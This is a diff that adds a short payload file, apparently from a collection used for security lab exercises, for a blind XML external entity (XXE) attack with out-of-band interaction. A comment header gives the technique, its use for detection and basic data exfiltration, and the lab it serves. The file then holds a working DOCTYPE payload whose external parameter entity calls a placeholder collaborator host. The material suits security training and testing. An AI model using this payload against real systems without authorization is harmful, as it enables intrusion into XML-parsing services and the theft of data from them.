@@ -1,0 +1,7 @@
+<!-- 
+Payload: Blind XXE with Out-of-Band Interaction
+Usage: OOB detection and basic data exfil
+Lab: Blind XXE with out-of-band interaction
+Note: Replace http://COLLABORATOR with your actual collaborator/interactsh payload
+-->
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR">%xxe;]>
